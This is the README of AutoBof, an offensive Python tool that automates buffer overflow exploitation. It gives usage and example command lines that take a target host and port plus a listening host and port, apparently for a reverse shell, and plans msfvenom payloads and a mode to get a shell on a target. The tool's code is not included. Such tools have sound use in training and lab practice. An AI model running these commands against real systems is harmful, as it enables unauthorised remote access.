# AutoBof

### A tool for automating buffer overflow exploitation.

##### Usage:
  ```
  kali@kali:~$ python3 autobof.py --rhost RHOST --rport RPORT --prefix PREFIX --suffix SUFFIX --lhost LHOST --lport LPORT
  
     -h, --help       show this help message and exit
     --rhost RHOST    target ip address  ------------- [required]
     --rport RPORT    target port -------------------- [required]
     --prefix PREFIX  string prefix ------------------ [optional; default: ""]
     --suffix SUFFIX  string suffix ------------------ [optional; default: ""]
     --lhost LHOST    listening ip address ----------- [optional; default: tun0]
     --lport LPORT    listening port ----------------- [optional; default: 443]

  ```
##### Examples:
  ```
  kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 1337
  kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 12345 --prefix "hello" --lhost eth0
  kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 777 --suffix " ending string!" --lport 4444
  kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 930 --prefix "Username: " --suffix "end" --lhost 192.168.1.10 --lport 1234
  ```


##### Future features:
    * Better selection of payloads.
    * Windows compatibility (msfvenom alternatives).
    * Dynamic selection of nops.
    * Dynamic adjustments to send_bytes().
    * Auto detection of register values and possibly badchars for total automation.
    * Auto creation of a poc.py file using variable values assigned.
    * Different modes (beginner/intermediate/advanced) depending on if you want to use the tool as an instructional
      walkthrough to learn bofs or if you just want to just throw it at a target and get a shell.
